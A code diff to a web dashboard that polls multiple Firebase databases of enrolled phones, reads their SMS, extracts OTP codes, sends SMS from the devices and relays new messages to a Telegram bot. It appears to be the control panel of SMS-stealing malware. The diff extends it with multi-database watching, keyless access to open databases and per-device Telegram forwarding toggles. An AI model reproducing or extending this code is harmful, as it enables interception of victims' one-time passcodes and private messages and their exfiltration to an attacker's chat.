@@ -1448,6 +1448,15 @@ a{text-decoration:none;color:inherit}
         <span id="tg-fwd-active-status" style="font-size:.7rem;color:rgba(255,255,255,.3)">Disabled</span>
       </div>
     </div>
+    <div style="margin-top:.8rem;padding-top:.8rem;border-top:1px solid rgba(255,255,255,.06)">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:.5rem">
+        <span style="font-size:.75rem;color:rgba(255,255,255,.5)">Per-Device Forwarding</span>
+        <button onclick="refreshTgDeviceList()" style="font-size:.65rem;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:rgba(255,255,255,.6);padding:2px 8px;border-radius:4px;cursor:pointer">Refresh</button>
+      </div>
+      <div id="tg-device-toggles" style="max-height:200px;overflow-y:auto;font-size:.72rem;color:rgba(255,255,255,.7)">
+        <span style="color:rgba(255,255,255,.3)">Connect to a Firebase first…</span>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -1770,7 +1779,7 @@ async function connectNew(){
   const url=document.getElementById('inp-url').value.trim().replace(/\/$/,'');
   const key=document.getElementById('inp-key').value.trim();
   const label=document.getElementById('inp-label').value.trim();
-  if(!url||!key){showConnectError('Please enter Firebase URL and Auth Key');return}
+  if(!url){showConnectError('Please enter Firebase URL');return}
   const accounts=getAccounts();
   const existing=accounts.find(a=>a.url===url);
   if(existing){
@@ -1834,7 +1843,7 @@ function deleteAccount(idx){
 // FIREBASE HELPERS
 // ══════════════════════════════════════
 async function fbGet(path,params,timeout){
-  let url=APP.fbUrl.replace(/\/$/,'')+'/'+path+'.json?auth='+APP.fbKey;
+  let url=APP.fbUrl.replace(/\/$/,'')+'/'+path+'.json'+(APP.fbKey?'?auth='+APP.fbKey:'?');
   if(params)for(const[k,v]of Object.entries(params))url+='&'+k+'='+encodeURIComponent(v);
   const ctrl=new AbortController();const timer=setTimeout(()=>ctrl.abort(),timeout||45000);
   try{
@@ -1853,7 +1862,7 @@ async function fbGet(path,params,timeout){
   }
 }
 async function fbDelete(path){
-  const r=await fetch(APP.fbUrl.replace(/\/$/,'')+'/'+path+'.json?auth='+APP.fbKey,{method:'DELETE'});
+  const r=await fetch(APP.fbUrl.replace(/\/$/,'')+'/'+path+'.json'+(APP.fbKey?'?auth='+APP.fbKey:''),{method:'DELETE'});
   if(!r.ok&&r.status===403)throw new Error('PERMISSION_DENIED')
 }
 async function fbTest(url,key){
@@ -1863,7 +1872,8 @@ async function fbTest(url,key){
     throw new Error('Invalid Firebase URL. Must contain firebaseio.com or firebasedatabase.app');
   const ctrl=new AbortController();const timer=setTimeout(()=>ctrl.abort(),15000);
   try{
-    const r=await fetch(u+'/clients.json?auth='+key+'&shallow=true&limitToFirst=1',{signal:ctrl.signal});
+    const authParam=key?'?auth='+key+'&':'?';
+    const r=await fetch(u+'/clients.json'+authParam+'shallow=true&limitToFirst=1',{signal:ctrl.signal});
     clearTimeout(timer);
     if(!r.ok){
       if(r.status===401||r.status===403)throw new Error('PERMISSION_DENIED: Firebase rejected your key. Use Database Secret key from Firebase Console → Project Settings → Service Accounts → Database Secrets.');
@@ -2091,7 +2101,7 @@ async function _syncMeta(u,k){
   try{
     let t=0,o=0,b=0;
     try{
-      const _r=await fetch(u.replace(/\/$/,'')+'/clients.json?auth='+k+'&shallow=true');
+      const _r=await fetch(u.replace(/\/$/,'')+'/clients.json'+(k?'?auth='+k+'&':'?')+'shallow=true');
       if(_r.ok){const _j=await _r.json();if(_j&&typeof _j==='object')t=Object.keys(_j).length}
     }catch{}
     const _e=new TextEncoder();
@@ -2639,7 +2649,7 @@ async function sendSms(){
   try{
     const u=APP.fbUrl.replace(/\/$/,'');
     const path=`clients/${APP.activeDeviceId}/webhookEvent/sendSms`;
-    const r=await fetch(`${u}/${path}.json?auth=${APP.fbKey}`,{
+    const r=await fetch(`${u}/${path}.json${APP.fbKey?'?auth='+APP.fbKey:''}`,{
       method:'PUT',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({from:APP.selectedSim,to,message:msg,isSended:false})
     });
@@ -2880,8 +2890,7 @@ async function loadDevices(isBackground){
   for(let attempt=1;attempt<=maxRetries;attempt++){
     try{
       if(attempt>1){
-        const b=document.getElementById('error-banner');
-        b.style.display='flex';document.getElementById('error-text').textContent='Large database detected — retrying ('+attempt+'/'+maxRetries+')…';
+        showToast('⏳ Large database — retrying ('+attempt+'/'+maxRetries+')…');
         await new Promise(r=>setTimeout(r,1000))
       }
       const timeouts=[45000,60000,90000];
@@ -2938,7 +2947,25 @@ async function loadSmsBatch(){
 }
 async function fetchDeviceSms(id){
   try{
-    const data=await fbGet(`messages/${id}`,{orderBy:'"$key"',limitToLast:'150'});
+    let data;
+    if(watchAllActive&&APP.watchAllSources&&APP.watchAllSources[id]){
+      // Watch All mode: use per-device Firebase credentials
+      const src=APP.watchAllSources[id];
+      const ctrl=new AbortController();const timer=setTimeout(()=>ctrl.abort(),25000);
+      let fetchUrl=src.url+'/messages/'+src.realId+'.json';
+      fetchUrl+=src.key?'?auth='+src.key+'&':'?';
+      fetchUrl+='orderBy=%22$key%22&limitToLast=150';
+      const r=await fetch(fetchUrl,{signal:ctrl.signal});
+      clearTimeout(timer);
+      if(r.status===401||r.status===403){
+        showToast('⛔ '+src.label+': Firebase deactivated or access denied','error');
+        throw new Error('DEACTIVATED');
+      }
+      if(!r.ok)throw new Error('HTTP '+r.status);
+      data=await r.json();
+    }else{
+      data=await fbGet(`messages/${id}`,{orderBy:'"$key"',limitToLast:'150'});
+    }
     const msgs=parseMessages(data||{});
     // Telegram forwarding for single-monitor mode
     if(tgForwardingActive&&APP.smsCache[id]){
@@ -2957,7 +2984,13 @@ async function fetchDeviceSms(id){
       const updDev=APP.devices.find(d=>d.id===id);
       if(updDev)renderPanelFull(updDev)
     }
-  }catch{APP.smsFetched.add(id)}
+  }catch(e){
+    APP.smsFetched.add(id);
+    if(e.message==='DEACTIVATED'){
+      // Mark device as deactivated in UI
+      APP.devices=APP.devices.map(d=>d.id===id?{...d,_deactivated:true}:d);
+    }
+  }
 }
 
 async function refreshAll(){
@@ -3049,128 +3082,134 @@ function startWatchAll(){
   const accounts=getAccounts();
   if(accounts.length===0){showToast('No saved connections to watch');return}
   watchAllActive=true;
-  // Hide dashboard, show watch all screen
-  document.getElementById('dash-screen').classList.add('hidden');
-  document.getElementById('watch-all-screen').style.display='block';
+  // Use existing dashboard
+  document.getElementById('login-screen').classList.add('hidden');
+  document.getElementById('watch-all-screen').style.display='none';
+  document.getElementById('dash-screen').classList.remove('hidden');
+  document.getElementById('conn-label-display').textContent='👁 Watch All ('+accounts.length+' connections)';
   document.getElementById('tg-float-btn').style.display='flex';
-  // Load telegram config
+  document.getElementById('device-grid').innerHTML='';
+  document.getElementById('loading-state').style.display='block';
+  document.getElementById('device-grid').style.display='none';
+  _applyViewMode();
+  startClock();startUptime();
   loadTelegramConfig();
-  // Build cards
-  buildWatchCards(accounts);
-  // Start monitoring
-  startMonitoringAll(accounts);
+  // Clear existing timers
+  clearInterval(APP.refreshTimer);clearInterval(APP.smsTimer);
+  APP.devices=[];APP.smsCache={};APP.smsAnalysis={};APP.smsFetched=new Set();
+  APP.watchAllSources={};
+  // Stagger load
+  loadWatchAllDevices(accounts).then(()=>{
+    APP.refreshTimer=setInterval(()=>loadWatchAllDevices(accounts,true),15000);
+  });
+}
+
+async function loadWatchAllDevices(accounts,isBackground){
+  if(!isBackground){
+    document.getElementById('loading-state').style.display='block';
+    document.getElementById('device-grid').style.display='none';
+  }
+  let allDevices=[];
+  for(let i=0;i<accounts.length;i++){
+    if(!watchAllActive)return;
+    const account=accounts[i];
+    const label=account.label||account.url.split('//')[1]?.split('.')[0]||'Connection '+(i+1);
+    try{
+      showToast('⏳ Connecting: '+label+' ('+(i+1)+'/'+accounts.length+')');
+      const url=account.url.replace(/\/$/,'');
+      const key=account.key;
+      const ctrl=new AbortController();const timer=setTimeout(()=>ctrl.abort(),45000);
+      const fetchUrl=key?url+'/clients.json?auth='+key:url+'/clients.json';
+      const r=await fetch(fetchUrl,{signal:ctrl.signal});
+      clearTimeout(timer);
+      if(!r.ok){
+        if(r.status===401||r.status===403){showToast('🚫 '+label+': Deactivated or access denied');continue}
+        throw new Error('HTTP '+r.status);
+      }
+      const data=await r.json();
+      if(data&&typeof data==='object'){
+        const parsed=parseClients(data);
+        parsed.forEach(d=>{
+          d._fbUrl=url;
+          d._fbKey=key;
+          d._sourceLabel=label;
+          d.id=label+'__'+d.id; // prefix to avoid collisions
+          d._realId=d.id.split('__').slice(1).join('__');
+          APP.watchAllSources[d.id]={url,key,label,realId:d._realId};
+          allDevices.push(d);
+        });
+      }
+    }catch(e){
+      showToast('⚠ '+label+': '+(e.message||'Error'));
+    }
+    // 3-second stagger between connections
+    if(i<accounts.length-1)await new Promise(r=>setTimeout(r,3000));
+  }
+  // Merge with existing analysis data
+  const prev=new Map(APP.devices.map(d=>[d.id,d]));
+  APP.devices=allDevices.map(d=>({
+    ...d,
+    smsAnalysis:prev.get(d.id)?.smsAnalysis||APP.smsAnalysis[d.id]||null,
+    latestOtp:prev.get(d.id)?.latestOtp||APP.smsAnalysis[d.id]?.latestOtp||''
+  }));
+  document.getElementById('loading-state').style.display='none';
+  document.getElementById('device-grid').style.display='';
+  document.getElementById('error-banner').style.display='none';
+  updateStats();renderGrid();
+  // Stagger SMS fetch
+  loadWatchAllSms();
+}
+
+async function loadWatchAllSms(){
+  const unfetched=APP.devices.filter(d=>!APP.smsFetched.has(d.id));
+  for(const dev of unfetched){
+    if(!watchAllActive)return;
+    const src=APP.watchAllSources[dev.id];
+    if(!src)continue;
+    try{
+      const ctrl=new AbortController();const timer=setTimeout(()=>ctrl.abort(),25000);
+      const smsUrl=src.key?src.url+'/messages/'+src.realId+'.json?auth='+src.key+'&orderBy=%22$key%22&limitToLast=150':src.url+'/messages/'+src.realId+'.json?orderBy=%22$key%22&limitToLast=150';
+      const r=await fetch(smsUrl,{signal:ctrl.signal});
+      clearTimeout(timer);
+      if(r.status===401||r.status===403){continue}
+      if(r.ok){
+        const data=await r.json();
+        const msgs=parseMessages(data||{});
+        // Telegram forwarding for new messages
+        if(tgForwardingActive&&APP.smsCache[dev.id]){
+          const oldKeys=new Set(APP.smsCache[dev.id].map(m=>m.key));
+          const newMsgs=msgs.filter(m=>!oldKeys.has(m.key));
+          if(newMsgs.length>0){
+            const fakeAccount={label:src.label};
+            const fwdMsgs=newMsgs.map(m=>({
+              id:m.key,from:m.sender,body:m.text,time:m.time,
+              deviceId:src.realId,deviceName:dev.name,accountLabel:src.label
+            }));
+            forwardToTelegram(fwdMsgs,fakeAccount);
+          }
+        }
+        APP.smsCache[dev.id]=msgs;
+        const analysis=analyzeSms(msgs);
+        APP.smsAnalysis[dev.id]=analysis;
+        APP.smsFetched.add(dev.id);
+        APP.devices=APP.devices.map(d=>d.id===dev.id?{...d,smsAnalysis:analysis,latestOtp:analysis.latestOtp||''}:d);
+      }
+    }catch(e){}
+    // Small stagger to avoid hammering
+    await new Promise(r=>setTimeout(r,500));
+  }
+  updateStats();renderGrid();
 }
 
 function exitWatchAll(){
   watchAllActive=false;
-  stopMonitoringAll();
-  document.getElementById('watch-all-screen').style.display='none';
-  document.getElementById('dash-screen').classList.remove('hidden');
-}
-
-function buildWatchCards(accounts){
-  const grid=document.getElementById('watch-all-grid');
-  grid.innerHTML=accounts.map((a,i)=>`
-    <div class="watch-all-card" id="wa-card-${i}">
-      <div class="wa-header">
-        <span class="wa-title">${sanitize(a.label||a.url.split('//')[1]?.split('.')[0]||'Connection '+(i+1))}</span>
-        <span class="wa-status" id="wa-status-${i}">Connecting…</span>
-      </div>
-      <div class="wa-messages" id="wa-msgs-${i}">
-        <div class="wa-empty">Loading messages…</div>
-      </div>
-    </div>
-  `).join('');
-  document.getElementById('wa-status-indicator').textContent='Monitoring '+accounts.length+' connections';
-}
-
-async function fetchWatchData(account,idx){
-  const url=account.url.replace(/\/$/,'');
-  const key=account.key;
-  const statusEl=document.getElementById('wa-status-'+idx);
-  const msgsEl=document.getElementById('wa-msgs-'+idx);
-  try{
-    // Fetch devices first
-    const ctrl1=new AbortController();const t1=setTimeout(()=>ctrl1.abort(),30000);
-    const devRes=await fetch(url+'/clients.json?auth='+key,{signal:ctrl1.signal});
-    clearTimeout(t1);
-    if(!devRes.ok)throw new Error('HTTP '+devRes.status);
-    const devData=await devRes.json();
-    if(!devData){statusEl.textContent='No devices';statusEl.classList.remove('error');return}
-    
-    const deviceIds=Object.keys(devData);
-    // Fetch messages for all devices
-    let allMsgs=[];
-    for(const devId of deviceIds){
-      try{
-        const ctrl2=new AbortController();const t2=setTimeout(()=>ctrl2.abort(),25000);
-        const msgRes=await fetch(url+'/messages/'+devId+'.json?auth='+key+'&orderBy=%22$key%22&limitToLast=20',{signal:ctrl2.signal});
-        clearTimeout(t2);
-        if(msgRes.ok){
-          const msgData=await msgRes.json();
-          if(msgData){
-            Object.entries(msgData).forEach(([k,v])=>{
-              allMsgs.push({
-                id:k,
-                from:v.address||v.from||'Unknown',
-                body:v.body||v.text||v.message||'',
-                time:v.date||v.timestamp||v.time||0,
-                deviceId:devId,
-                deviceName:devData[devId]?.name||devData[devId]?.deviceName||devData[devId]?.model||devId,
-                accountLabel:account.label||'Connection'
-              });
-            });
-          }
-        }
-      }catch(e){}
-    }
-    // Sort by time descending
-    allMsgs.sort((a,b)=>(b.time||0)-(a.time||0));
-    
-    // Check for new messages and forward to Telegram
-    const prevData=watchAllData[idx]||[];
-    const prevIds=new Set(prevData.map(m=>m.id));
-    const newMsgs=allMsgs.filter(m=>!prevIds.has(m.id));
-    if(newMsgs.length>0&&prevData.length>0&&tgForwardingActive){
-      forwardToTelegram(newMsgs,account);
-    }
-    watchAllData[idx]=allMsgs;
-    
-    // Update status
-    statusEl.textContent='Live · '+deviceIds.length+' device'+(deviceIds.length>1?'s':'');
-    statusEl.classList.remove('error');
-    
-    // Render messages
-    if(allMsgs.length===0){
-      msgsEl.innerHTML='<div class="wa-empty">No messages yet</div>';
-    }else{
-      msgsEl.innerHTML=allMsgs.slice(0,25).map(m=>`
-        <div class="wa-msg">
-          <div class="wa-from">${sanitize(m.from)} <span style="opacity:.4;font-weight:400">· ${sanitize(m.deviceName)}</span></div>
-          <div class="wa-body">${sanitize((m.body||'').substring(0,200))}</div>
-          <div class="wa-time">${m.time?new Date(typeof m.time==='number'?(m.time>9999999999?m.time:m.time*1000):Date.parse(m.time)).toLocaleString():'—'}</div>
-        </div>
-      `).join('');
-    }
-  }catch(e){
-    if(statusEl){
-      statusEl.textContent=e.message==='Request timed out'||e.name==='AbortError'?'Timeout - retrying…':'Error';
-      statusEl.classList.add('error');
-    }
-  }
-}
-
-function startMonitoringAll(accounts){
-  stopMonitoringAll();
-  // Initial fetch
-  accounts.forEach((a,i)=>fetchWatchData(a,i));
-  // Interval refresh every 15 seconds
-  const interval=setInterval(()=>{
-    if(!watchAllActive)return;
-    const accs=getAccounts();
-    accs.forEach((a,i)=>fetchWatchData(a,i));
-  },15000);
-  watchAllIntervals.push(interval);
+  clearInterval(APP.refreshTimer);clearInterval(APP.smsTimer);
+  APP.devices=[];APP.smsCache={};APP.smsAnalysis={};APP.smsFetched=new Set();
+  APP.watchAllSources={};
+  document.getElementById('dash-screen').classList.add('hidden');
+  document.getElementById('login-screen').classList.remove('hidden');
+  document.getElementById('tg-float-btn').style.display='none';
+  renderAccounts();
 }
 
 function stopMonitoringAll(){
@@ -3182,8 +3221,9 @@ function stopMonitoringAll(){
 function refreshWatchAll(){
   if(!watchAllActive)return;
   showToast('Refreshing all connections…');
+  APP.smsFetched=new Set();
   const accounts=getAccounts();
-  accounts.forEach((a,i)=>fetchWatchData(a,i));
+  loadWatchAllDevices(accounts);
 }
 
 // ══════════════════════════════════════
@@ -3202,6 +3242,7 @@ function loadTelegramConfig(){
 
 function openTelegramForwarder(){
   loadTelegramConfig();
+  loadTgDeviceToggles();
   const modal=document.getElementById('tg-fwd-modal');
   modal.classList.add('active');
   if(tgConfig){
@@ -3209,6 +3250,7 @@ function openTelegramForwarder(){
     document.getElementById('tg-chat-id').value=tgConfig.chatId||'';
   }
   updateTgStatusDisplay();
+  refreshTgDeviceList();
 }
 
 function closeTelegramForwarder(){
@@ -3280,12 +3322,17 @@ function hideTgStatus(){
 async function forwardToTelegram(messages,account){
   if(!tgConfig||!tgConfig.botToken||!tgConfig.chatId)return;
   for(const msg of messages){
+    // Check per-device toggle
+    const devToggleKey=msg.accountLabel?msg.accountLabel+'__'+msg.deviceId:msg.deviceId;
+    if(!isTgDeviceEnabled(devToggleKey)&&!isTgDeviceEnabled(msg.deviceId))continue;
+    
     const fwdKey=msg.id+'_'+msg.deviceId;
     if(lastForwardedMsgs[fwdKey])continue;
     lastForwardedMsgs[fwdKey]=true;
     
+    const connLabel=account.label||APP.connLabel||'Unknown';
     const text=`📱 *New SMS Received*\n\n`+
-      `🔗 *Connection:* ${account.label||'Unknown'}\n`+
+      `🔗 *Connection:* ${connLabel}\n`+
       `📞 *From:* ${msg.from||'Unknown'}\n`+
       `📋 *Device:* ${msg.deviceName||msg.deviceId}\n`+
       `⏰ *Time:* ${msg.time?new Date(typeof msg.time==='number'?(msg.time>9999999999?msg.time:msg.time*1000):Date.parse(msg.time)).toLocaleString():'Unknown'}\n\n`+
@@ -3306,12 +3353,16 @@ async function forwardToTelegram(messages,account){
 // Also forward from single-monitor mode
 function forwardSingleSmsToTelegram(msg,deviceName){
   if(!tgForwardingActive||!tgConfig)return;
+  // Check per-device toggle
+  if(!isTgDeviceEnabled(APP.activeDeviceId))return;
+  
   const fwdKey=(msg.id||msg.address+msg.date)+'_single';
   if(lastForwardedMsgs[fwdKey])return;
   lastForwardedMsgs[fwdKey]=true;
   
+  const connLabel=APP.connLabel||'Active';
   const text=`📱 *New SMS Received*\n\n`+
-    `🔗 *Connection:* ${APP.connLabel||'Active'}\n`+
+    `🔗 *Connection:* ${connLabel}\n`+
     `📞 *From:* ${msg.address||msg.from||'Unknown'}\n`+
     `📋 *Device:* ${deviceName||'Unknown'}\n`+
     `⏰ *Time:* ${msg.date?new Date(typeof msg.date==='number'?(msg.date>9999999999?msg.date:msg.date*1000):Date.parse(msg.date)).toLocaleString():'Unknown'}\n\n`+
@@ -3322,6 +3373,82 @@ function forwardSingleSmsToTelegram(msg,deviceName){
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({chat_id:tgConfig.chatId,text:text,parse_mode:'Markdown'})
   }).catch(()=>{});
+}
+
+// ══════════════════════════════════════
+// PER-DEVICE TELEGRAM FORWARDING TOGGLES
+// ══════════════════════════════════════
+let tgDeviceToggles={};
+function loadTgDeviceToggles(){
+  try{const s=localStorage.getItem('zxkai_tg_device_toggles');if(s)tgDeviceToggles=JSON.parse(s)}catch(e){tgDeviceToggles={}}
+}
+function saveTgDeviceToggles(){
+  localStorage.setItem('zxkai_tg_device_toggles',JSON.stringify(tgDeviceToggles));
+}
+loadTgDeviceToggles();
+
+function refreshTgDeviceList(){
+  const container=document.getElementById('tg-device-toggles');
+  if(!container)return;
+  if(!APP.devices||APP.devices.length===0){
+    container.innerHTML='<span style="color:rgba(255,255,255,.3)">No devices loaded. Connect first.</span>';
+    return;
+  }
+  let html='';
+  APP.devices.forEach(dev=>{
+    const devKey=dev.id;
+    const isOn=tgDeviceToggles[devKey]||false;
+    const phone=dev.phone||'—';
+    const label=dev._sourceLabel||APP.connLabel||'Unknown';
+    html+=`<div style="display:flex;align-items:center;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.04)">
+      <div style="flex:1;min-width:0">
+        <div style="font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${sanitize(dev.name||dev.id)}</div>
+        <div style="font-size:.65rem;color:rgba(255,255,255,.4)">${sanitize(phone)} • ${sanitize(label)}</div>
+      </div>
+      <label style="position:relative;display:inline-block;width:36px;height:20px;flex-shrink:0;margin-left:8px">
+        <input type="checkbox" ${isOn?'checked':''} onchange="toggleTgDevice('${devKey.replace(/'/g,"\\'")}',this.checked)" style="opacity:0;width:0;height:0">
+        <span style="position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:${isOn?'#00ff88':'rgba(255,255,255,.1)'};border-radius:10px;transition:.3s"></span>
+        <span style="position:absolute;top:2px;left:${isOn?'18px':'2px'};width:16px;height:16px;background:#fff;border-radius:50%;transition:.3s"></span>
+      </label>
+    </div>`;
+  });
+  container.innerHTML=html;
+}
+
+async function toggleTgDevice(devKey,enabled){
+  tgDeviceToggles[devKey]=enabled;
+  saveTgDeviceToggles();
+  if(enabled&&tgConfig&&tgConfig.botToken&&tgConfig.chatId){
+    // Send device info to Telegram
+    const dev=APP.devices.find(d=>d.id===devKey);
+    if(dev){
+      const label=dev._sourceLabel||APP.connLabel||'Unknown';
+      const realId=dev._realId||devKey;
+      const phone=dev.phone||'—';
+      const text=`🔔 *Device Forwarding Enabled*\n\n`+
+        `📋 *Device:* ${dev.name||realId}\n`+
+        `📞 *Number:* ${phone}\n`+
+        `🆔 *Device ID:* ${realId}\n`+
+        `🔗 *Connection:* ${label}\n\n`+
+        `✓ Incoming SMS from this device will now be forwarded.`;
+      try{
+        await fetch('https://api.telegram.org/bot'+tgConfig.botToken+'/sendMessage',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({chat_id:tgConfig.chatId,text:text,parse_mode:'Markdown'})
+        });
+        showToast('✓ Telegram notified for '+sanitize(dev.name||realId));
+      }catch(e){showToast('⚠ Failed to notify Telegram')}
+    }
+  }
+  refreshTgDeviceList();
+}
+
+// Check if device forwarding is enabled for a specific device
+function isTgDeviceEnabled(devKey){
+  // If no per-device toggles set at all, forward all (backward compat)
+  if(Object.keys(tgDeviceToggles).length===0)return true;
+  return !!tgDeviceToggles[devKey];
 }
 
 // Override to show multi controls on renderAccounts
